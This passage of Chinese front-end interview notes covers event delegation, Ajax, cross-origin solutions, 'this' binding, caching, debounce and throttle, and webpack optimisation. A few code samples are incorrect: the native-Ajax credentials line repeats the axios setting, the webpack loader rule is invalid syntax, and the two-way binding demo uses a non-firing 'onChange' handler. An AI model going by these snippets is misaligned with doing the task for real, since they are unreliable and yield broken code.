  - 捕获阶段：从window对象传导到目标节点（上层传到底层）称为“捕获阶段”（capture phase），捕获阶段不会响应任何事件；
  - 目标阶段：在目标节点上触发，称为“目标阶段”
  - 冒泡阶段：从目标节点传导回window对象（从底层传回上层），称为“冒泡阶段”（bubbling phase）。事件代理即是利用事件冒泡的机制把里层所需要响应的事件绑定到外层；
    - `event.target`判断具体有哪个子节点触发
    - `target`是指获取事件的目标。`currentTarget`是指其事件处理程序当前正在处理事件的那个元素
- 优点：
  - 可以大量节省内存占用，减少事件注册，比如在`ul`上代理所有`li`的`click`事件就非常棒
  - 可以实现当新增子对象时无需再次对其绑定

## Ajax原理

- `Ajax`的原理简单来说是在用户和服务器之间加了—个中间层(`AJAX`引擎)，通过**`XmlHttpRequest`**对象来向服务器发异步请求，从服务器获得数据，然后用`javascrip`t来操作`DOM`而更新页面。使用户操作与服务器响应异步化。这其中最关键的一步就是从服务器获得请求数据
- `Ajax`的过程只涉及`JavaScript`、`XMLHttpRequest`和`DOM`。`XMLHttpRequest`是`aja`x的核心机制

```javascript
/** 1. 创建连接 **/
var xhr = null;
xhr = new XMLHttpRequest()
/** 2. 连接服务器 **/
xhr.open('get', url, true)
/** 3. 发送请求 **/
xhr.send(null);
/** 4. 接受请求 **/
xhr.onreadystatechange = function(){
	if(xhr.readyState == 4){
		if(xhr.status == 200){
			success(xhr.responseText);
		} else { 
			/** false **/
			fail && fail(xhr.status);
		}
	}
}
```

**有那些优缺点?**

- 优点：
  - 通过异步模式，提升了用户体验.
  - 优化了浏览器和服务器之间的传输，减少不必要的数据往返，减少了带宽占用.
  - `Ajax`在客户端运行，承担了一部分本来由服务器承担的工作，减少了大用户量下的服务器负载。
  - `Ajax`可以实现动态不刷新（局部刷新）
- 缺点：
  - 安全问题 `AJAX`暴露了与服务器交互的细节。
  - 对搜索引擎的支持比较弱。
  - 不容易调试。

## 如何解决跨域问题?

> 首先了解下浏览器的同源策略 同源策略`SOP（Same origin policy）`是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到`XSS`、`CSFR`等攻击。所谓同源是指"**协议+域名+端口**"三者相同，即便两个不同的域名指向同一个`ip`地址，也非同源 

https://segmentfault.com/a/1190000011145364

### 通过jsonp跨域

### document.domain + iframe跨域

### location.hash + iframe
### window.name + iframe跨域
### postMessage跨域
### 跨域资源共享（CORS）

普通跨域请求：只服务端设置Access-Control-Allow-Origin即可，前端无须设置，若要带cookie请求：前后端都需要设置。

需注意的是：由于同源策略的限制，所读取的cookie为跨域请求接口所在域的cookie，而非当前页。如果想实现当前页cookie的写入，可参考下文：七、nginx反向代理中设置proxy_cookie_domain 和 八、NodeJs中间件代理中cookieDomainRewrite参数的设置。

目前，所有浏览器都支持该功能(IE8+：IE8/9需要使用XDomainRequest对象来支持CORS）)，CORS也已经成为主流的跨域解决方案。

* 前端

  * 原生ajax  ： axios.defaults.withCredentials = true
  * axios：axios.defaults.withCredentials = true

* 服务端

  * ```javascript
    'Access-Control-Allow-Credentials': 'true',     // 后端允许发送Cookie
    'Access-Control-Allow-Origin': 'http://www.domain1.com',    // 允许访问的域（协议+域名+端口）
    ```

### nginx代理跨域

```
#proxy服务器
server {
    listen       81;
    server_name  www.domain1.com;

    location / {
        proxy_pass   http://www.domain2.com:8080;  #反向代理
        proxy_cookie_domain www.domain2.com www.domain1.com; #修改cookie里域名
        index  index.html index.htm;

        # 当用webpack-dev-server等中间件代理接口访问nignx时，此时无浏览器参与，故没有同源限制，下面的跨域配置可不启用
        add_header Access-Control-Allow-Origin http://www.domain1.com;  #当前端只跨域不带cookie时，可为*
        add_header Access-Control-Allow-Credentials true;
    }
}
```

### nodejs中间件代理跨域

node中间件实现跨域代理，原理大致与nginx相同，都是通过启一个代理服务器，实现数据的转发，也可以通过设置cookieDomainRewrite参数修改响应头中cookie中域名，实现当前域的cookie写入，方便接口登录认证。

### WebSocket协议跨域

## 确定`this`指向

ES5定义的`this`的绑定规则，有以下4种：

### 默认绑定

**非严格模式下，this 指向全局对象，严格模式下，this 会绑定到 undefined**。

```js
var a = 1;

function foo() {
  console.log(this.a);
};

foo(); // 1，非严格模式下，this 指向全局对象 Window，这里相当于 Window.a


function bar() {
  "use strict";
  console.log(this.a);
};

bar(); // Uncaught TypeError: Cannot read property 'a' of undefined，严格模式下，this 会绑定到 undefined，尝试从 undefined 读取属性会报错
```

### 隐式绑定

**如果函数在调用位置有上下文对象，this 就会隐式地绑定到这个对象上**

```js
var obj = {
  a: 2,
  foo: foo, // <-- foo函数 的调用位置
};

obj.foo(); // 2，foo 在调用位置有上下文对象 obj，this 会隐式地绑定到 obj，this.a 相当于 obj.a
```

* 特殊情况1：使用函数别名调用时

```js
var bar = obj.foo;  // bar === foo了，跟obj就没关系了

bar(); 
// 1，赋值并不会改变引用本身，使用函数别名调用时，
// bar 虽然是 obj.foo 的一个引用，但是实际上引用的还是 foo 函数本身，
// 所以这里隐式绑定并没有生效， this 应用的是默认绑定
```

* 特殊情况2：函数作为参数传递时

```js
function bar(fn) {
  fn(); // <-- 调用位置
};

bar(obj.foo); // 1, 参数传递也是一种隐式赋值，即使传入的是函数，这里相当于 fn = obj.foo，所以 fn 实际上引用的还是 foo 函数本身，this 应用默认绑定
```

### 显式绑定

我们知道 `call`，`apply`，`bind` 等方法可以改变 `this` 的指向

```js
// bind 调用后不会执行，而是会返回一个硬绑定的函数，所以通过 bind 可以解决绑定丢失的问题
var bar = foo.bind(obj);

bar(); // 2，bar 是通过 bind 返回后的一个硬绑定函数，其内部应用了显式绑定
```

### `new`绑定

new 会返回一个对象，这个对象绑定到构造函数的 this

### 箭头函数

ES6 中新增了一种函数类型，**箭头函数**[2]，箭头函数中 `this` 不会应用上述规则，而是**根据最外层的词法作用域来确定 this**，简单来说，箭头函数的 `this` 就是它**外面第一个不是箭头函数的函数的 this**：

### 总结
- this 的绑定规则有四种：默认绑定，隐式绑定，显式绑定，new绑定
- 无法应用其他 3 种规则时就是默认绑定，严格模式下 this 为 undefined，非严格模式下为全局对象
- 函数在调用位置有上下文对象时，this 会隐式绑定到这个对象
- 可以通过 call，apply，bind 显式地改变 this 的指向
- 通过 new 调用时，this 会绑定到调用函数，new 绑定是优先级最高的绑定
- 箭头函数中的 this 继承至它外层第一个不是箭头函数的函数

## 怎样添加、移除、移动、复制、创建和查找节点

**创建新节点**

```js
createDocumentFragment()    //创建一个DOM片段
createElement()   //创建一个具体的元素
createTextNode()   //创建一个文本节点
```

**添加、移除、替换、插入**

```js
appendChild()      //添加
removeChild()      //移除
replaceChild()      //替换
insertBefore()      //插入
```

**查找**

```js
getElementsByTagName()    //通过标签名称
getElementsByName()     //通过元素的Name属性的值
getElementById()        //通过元素Id，唯一性
```

## window.onload和$(document).ready

> 原生`JS`的`window.onload`与`Jquery`的`$(document).ready(function(){})`有什么不同？如何用原生JS实现Jq的`ready`方法？

- `window.onload()`方法是必须等到页面内包括图片的所有元素加载完毕后才能执行。
- `$(document).ready()`是`DOM`结构绘制完毕后就执行，不必等到加载完毕

```js
function ready(fn){
      if(document.addEventListener) {        //标准浏览器
          document.addEventListener('DOMContentLoaded', function() {
              //注销事件, 避免反复触发
              document.removeEventListener('DOMContentLoaded',arguments.callee, false);
              fn();            //执行函数
          }, false);
      }else if(document.attachEvent) {        //IE
          document.attachEvent('onreadystatechange', function() {
             if(document.readyState == 'complete') {
                 document.detachEvent('onreadystatechange', arguments.callee);
                 fn();        //函数执行
             }
         });
     }
 };
```

## 数组去重

**利用ES6 Set去重（ES6中最常用）**

```js
function unique (arr) {
  return Array.from(new Set(arr))
}
var arr = [1,1,'true','true',true,true,15,15,false,false, undefined,undefined, null,null, NaN, NaN,'NaN', 0, 0, 'a', 'a',{},{}];
console.log(unique(arr))
```

**利用filter**

```js
function unique(arr) {
  return arr.filter(function(item, index, arr) {
    //当前元素，在原始数组中的第一个索引==当前索引值，否则返回当前元素
    return arr.indexOf(item, 0) === index;
  });
}
var arr = [1,1,'true','true',true,true,15,15,false,false, undefined,undefined, null,null, NaN, NaN,'NaN', 0, 0, 'a', 'a',{},{}];
console.log(unique(arr))
//[1, "true", true, 15, false, undefined, null, "NaN", 0, "a", {…}, {…}]
```

## 想实现一个对页面某个节点的拖曳？如何做？（使用原生JS）

- 给需要拖拽的节点绑定`mousedown`, `mousemove`, `mouseup`事件
- `mousedown`事件触发后，开始拖拽
- `mousemove`时，需要通过`event.clientX`和`clientY`获取拖拽位置，并实时更新位置
- `mouseup`时，拖拽结束
- 需要注意浏览器边界的情况

## Javascript全局函数和全局变量

**全局变量**

- `Infinity` 代表正的无穷大的数值。
- `NaN` 指示某个值是不是数字值。
- `undefined` 指示未定义的值。

**全局函数**

- `decodeURI()` 解码某个编码的 `URI`。
- `decodeURIComponent()` 解码一个编码的 `URI` 组件。
- `encodeURI()` 把字符串编码为 URI。
- `encodeURIComponent()` 把字符串编码为 `URI` 组件。
- `escape()` 对字符串进行编码。
- `eval()` 计算 `JavaScript` 字符串，并把它作为脚本代码来执行。
- `isFinite()` 检查某个值是否为有穷大的数。
- `isNaN()` 检查某个值是否是数字。
- `Number()` 把对象的值转换为数字。
- `parseFloat()` 解析一个字符串并返回一个浮点数。
- `parseInt()` 解析一个字符串并返回一个整数。
- `String()` 把对象的值转换为字符串。
- `unescape()` 对由`escape()` 编码的字符串进行解码

## 使用js实现一个持续的动画效果

**定时器思路**

```js
var e = document.getElementById('e')
var flag = true;
var left = 0;
setInterval(() => {
    left == 0 ? flag = true : left == 100 ? flag = false : ''
    flag ? e.style.left = ` ${left++}px` : e.style.left = ` ${left--}px`
}, 1000 / 60)
```

**requestAnimationFrame**

```js
//兼容性处理
window.requestAnimFrame = (function(){
    return window.requestAnimationFrame       ||
           window.webkitRequestAnimationFrame ||
           window.mozRequestAnimationFrame    ||
           function(callback){
                window.setTimeout(callback, 1000 / 60);
           };
})();

var e = document.getElementById("e");
var flag = true;
var left = 0;

function render() {
    left == 0 ? flag = true : left == 100 ? flag = false : '';
    flag ? e.style.left = ` ${left++}px` :
        e.style.left = ` ${left--}px`;
}

(function animloop() {
    render();
    requestAnimFrame(animloop);
})();
```

**使用css实现一个持续的动画效果**

```css
animation:mymove 5s infinite;

@keyframes mymove {
    from {top:0px;}
    to {top:200px;}
}
```

- `animation-name` 规定需要绑定到选择器的 `keyframe`名称。
- `animation-duration` 规定完成动画所花费的时间，以秒或毫秒计。
- `animation-timing-function` 规定动画的速度曲线。
- `animation-delay` 规定在动画开始之前的延迟。
- `animation-iteration-count` 规定动画应该播放的次数。
- `animation-direction` 规定是否应该轮流反向播放动画

## 怎么判断两个对象相等？

```js
obj={
    a:1,
    b:2
}
obj2={
    a:1,
    b:2
}
obj3={
    a:1,
    b:'2'
}
```

> 可以转换为字符串来判断

```js
JSON.stringify(obj)==JSON.stringify(obj2);//true
JSON.stringify(obj)==JSON.stringify(obj3);//fal
```

## 浏览器缓存

> 浏览器缓存分为强缓存和协商缓存。当客户端请求某个资源时，获取缓存的流程如下

- 先根据这个资源的一些 `http header` 判断它是否命中强缓存，如果命中，则直接从本地获取缓存资源，不会发请求到服务器；
- 当强缓存没有命中时，客户端会发送请求到服务器，服务器通过另一些`request header`验证这个资源是否命中协商缓存，称为`http`再验证，如果命中，服务器将请求返回，但不返回资源，而是告诉客户端直接从缓存中获取，客户端收到返回后就会从缓存中获取资源；
- 强缓存和协商缓存共同之处在于，如果命中缓存，服务器都不会返回资源； 区别是，强缓存不对发送请求到服务器，但协商缓存会。
- 当协商缓存也没命中时，服务器就会将资源发送回客户端。
- 当 `ctrl+f5` 强制刷新网页时，直接从服务器加载，跳过强缓存和协商缓存；
- 当 `f5`刷新网页时，跳过强缓存，但是会检查协商缓存；

**强缓存**

- `Expires`（该字段是 `http1.0` 时的规范，值为一个绝对时间的 `GMT` 格式的时间字符串，代表缓存资源的过期时间）
- `Cache-Control:max-age`（该字段是 `http1.1`的规范，强缓存利用其 `max-age` 值来判断缓存资源的最大生命周期，它的值单位为秒）

**协商缓存**

- `Last-Modified`（值为资源最后更新时间，随服务器response返回）
- `If-Modified-Since`（通过比较两个时间来判断资源在两次请求期间是否有过修改，如果没有修改，则命中协商缓存）
- `ETag`（表示资源内容的唯一标识，随服务器`response`返回）
- `If-None-Match`（服务器通过比较请求头部的`If-None-Match`与当前资源的`ETag`是否一致来判断资源是否在两次请求之间有过修改，如果没有修改，则命中协商缓存）

## Websocket和socket

https://cloud.tencent.com/developer/article/1921963

## 深浅拷贝

**浅拷贝**

- `Object.assign`
- 或者展开运算符

**深拷贝**

- 可以通过 `JSON.parse(JSON.stringify(object))` 来解决

```js
let a = {
    age: 1,
    jobs: {
        first: 'FE'
    }
}
let b = JSON.parse(JSON.stringify(a))
a.jobs.first = 'native'
console.log(b.jobs.first) // FE
```

**该方法也是有局限性的**

- 会忽略 `undefined`
- 不能序列化函数
- 不能解决循环引用的对象



## 防抖/节流

**防抖**

> 在滚动事件中需要做个复杂计算或者实现一个按钮的防二次点击操作。可以通过函数防抖动来实现

```js
// 使用 underscore 的源码来解释防抖动

/**
 * underscore 防抖函数，返回函数连续调用时，空闲时间必须大于或等于 wait，func 才会执行
 *
 * @param  {function} func        回调函数
 * @param  {number}   wait        表示时间窗口的间隔
 * @param  {boolean}  immediate   设置为ture时，是否立即调用函数
 * @return {function}             返回客户调用函数
 */
_.debounce = function(func, wait, immediate) {
    var timeout, args, context, timestamp, result;

    var later = function() {
      // 现在和上一次时间戳比较
      var last = _.now() - timestamp;
      // 如果当前间隔时间少于设定时间且大于0就重新设置定时器
      if (last < wait && last >= 0) {
        timeout = setTimeout(later, wait - last);
      } else {
        // 否则的话就是时间到了执行回调函数
        timeout = null;
        if (!immediate) {
          result = func.apply(context, args);
          if (!timeout) context = args = null;
        }
      }
    };

    return function() {
      context = this;
      args = arguments;
      // 获得时间戳
      timestamp = _.now();
      // 如果定时器不存在且立即执行函数
      var callNow = immediate && !timeout;
      // 如果定时器不存在就创建一个
      if (!timeout) timeout = setTimeout(later, wait);
      if (callNow) {
        // 如果需要立即执行函数的话 通过 apply 执行
        result = func.apply(context, args);
        context = args = null;
      }

      return result;
    };
  };
```

> 整体函数实现

对于按钮防点击来说的实现

- 开始一个定时器，只要我定时器还在，不管你怎么点击都不会执行回调函数。一旦定时器结束并设置为 null，就可以再次点击了
- 对于延时执行函数来说的实现：每次调用防抖动函数都会判断本次调用和之前的时间间隔，如果小于需要的时间间隔，就会重新创建一个定时器，并且定时器的延时为设定时间减去之前的时间间隔。一旦时间到了，就会执行相应的回调函数

**节流**

> 防抖动和节流本质是不一样的。防抖动是将多次执行变为最后一次执行，节流是将多次执行变成每隔一段时间执行

```javascript
/**
 * underscore 节流函数，返回函数连续调用时，func 执行频率限定为 次 / wait
 *
 * @param  {function}   func      回调函数
 * @param  {number}     wait      表示时间窗口的间隔
 * @param  {object}     options   如果想忽略开始函数的的调用，传入{leading: false}。
 *                                如果想忽略结尾函数的调用，传入{trailing: false}
 *                                两者不能共存，否则函数不能执行
 * @return {function}             返回客户调用函数   
 */
_.throttle = function(func, wait, options) {
    var context, args, result;
    var timeout = null;
    // 之前的时间戳
    var previous = 0;
    // 如果 options 没传则设为空对象
    if (!options) options = {};
    // 定时器回调函数
    var later = function() {
      // 如果设置了 leading，就将 previous 设为 0
      // 用于下面函数的第一个 if 判断
      previous = options.leading === false ? 0 : _.now();
      // 置空一是为了防止内存泄漏，二是为了下面的定时器判断
      timeout = null;
      result = func.apply(context, args);
      if (!timeout) context = args = null;
    };
    return function() {
      // 获得当前时间戳
      var now = _.now();
      // 首次进入前者肯定为 true
	  // 如果需要第一次不执行函数
	  // 就将上次时间戳设为当前的
      // 这样在接下来计算 remaining 的值时会大于0
      if (!previous && options.leading === false) previous = now;
      // 计算剩余时间
      var remaining = wait - (now - previous);
      context = this;
      args = arguments;
      // 如果当前调用已经大于上次调用时间 + wait
      // 或者用户手动调了时间
 	  // 如果设置了 trailing，只会进入这个条件
	  // 如果没有设置 leading，那么第一次会进入这个条件
	  // 还有一点，你可能会觉得开启了定时器那么应该不会进入这个 if 条件了
	  // 其实还是会进入的，因为定时器的延时
	  // 并不是准确的时间，很可能你设置了2秒
	  // 但是他需要2.2秒才触发，这时候就会进入这个条件
      if (remaining <= 0 || remaining > wait) {
        // 如果存在定时器就清理掉否则会调用二次回调
        if (timeout) {
          clearTimeout(timeout);
          timeout = null;
        }
        previous = now;
        result = func.apply(context, args);
        if (!timeout) context = args = null;
      } else if (!timeout && options.trailing !== false) {
        // 判断是否设置了定时器和 trailing
	    // 没有的话就开启一个定时器
        // 并且不能不能同时设置 leading 和 trailing
        timeout = setTimeout(later, remaining);
      }
      return result;
    };
  };
```

## 请简单实现双向数据绑定`mvvm`

```html
<input id="input"/>

<script>
const data = {};
const input = document.getElementById('input');
Object.defineProperty(data, 'text', {
  set(value) {
    input.value = value;
    this.value = value;
  }
});
input.onChange = function(e) {
  data.text = e.target.value;
}
</script>
```

##  为什么通常在发送数据埋点请求的时候使用的是 1x1 像素的透明 gif 图片

- 能够完成整个 HTTP 请求+响应（尽管不需要响应内容）
- 触发 GET 请求之后不需要获取和处理数据、服务器也不需要发送数据
- 跨域友好
- 执行过程无阻塞
- 相比 XMLHttpRequest 对象发送 GET 请求，性能上更好
- GIF的最低合法体积最小（最小的BMP文件需要74个字节，PNG需要67个字节，而合法的GIF，只需要43个字节）

## 在输入框中如何判断输入的是一个正确的网址

```js
function isUrl(url) {
       try {
           new URL(url);
           return true;
       }catch(err){
     return false;
}}
```

# webpack相关

## 1 打包体积 优化思路

- 提取第三方库或通过引用外部文件的方式引入第三方库
- 代码压缩插件`UglifyJsPlugin`
- 服务器启用gzip压缩
- 按需加载资源文件 `require.ensure`
- 优化`devtool`中的`source-map`
- 剥离`css`文件，单独打包
- 去除不必要插件，通常就是开发环境与生产环境用同一套配置文件导致

## 2 打包效率
- 开发环境采用增量构建，启用热更新
- 开发环境不做无意义的工作如提取`css`计算文件hash等
- 配置`devtool`
- 选择合适的`loader`
- 个别`loader`开启`cache` 如`babel-loader`
- 第三方库采用引入方式
- 提取公共代码
- 优化构建时的搜索路径 指明需要构建目录及不需要构建目录
- 模块化引入需要的部分

## 3 Loader
编写一个loader
> ```
> loader`就是一个`node`模块，它输出了一个函数。当某种资源需要用这个`loader`转换时，这个函数会被调用。并且，这个函数可以通过提供给它的`this`上下文访问`Loader API`。 `reverse-txt-loader
> ```

```js
// 定义
module.exports = function(src) {
  //src是原文件内容（abcde），下面对内容进行处理，这里是反转
  var result = src.split('').reverse().join('');
  //返回JavaScript源码，必须是String或者Buffer
  return `module.exports = '${result}'`;
}
//使用
{
	test: /\.txt$/,
	use: [
		{
			'./path/reverse-txt-loader'
		}
	]
},
```

## 4 说一下webpack的一些plugin，怎么使用webpack对项目进行优化

**构建优化**

- 减少编译体积 `ContextReplacementPugin`、`IgnorePlugin`、`babel-plugin-import`、`babel-plugin-transform-runtime`
- 并行编译 `happypack`、`thread-loader`、`uglifyjsWebpackPlugin`开启并行
- 缓存 `cache-loader`、`hard-source-webpack-plugin`、`uglifyjsWebpackPlugin`开启缓存、`babel-loader`开启缓存
- 预编译 `dllWebpackPlugin && DllReferencePlugin`、`auto-dll-webapck-plugin`

**性能优化**

- 减少编译体积 `Tree-shaking`、`Scope Hositing`
- `hash`缓存 `webpack-md5-plugin`
- 拆包 `splitChunksPlugin`、`import()`、`require.ensure`



# 手写
[10个常见的前端手写功能，你全都会吗？](https://juejin.cn/post/7031322059414175774#heading-0)
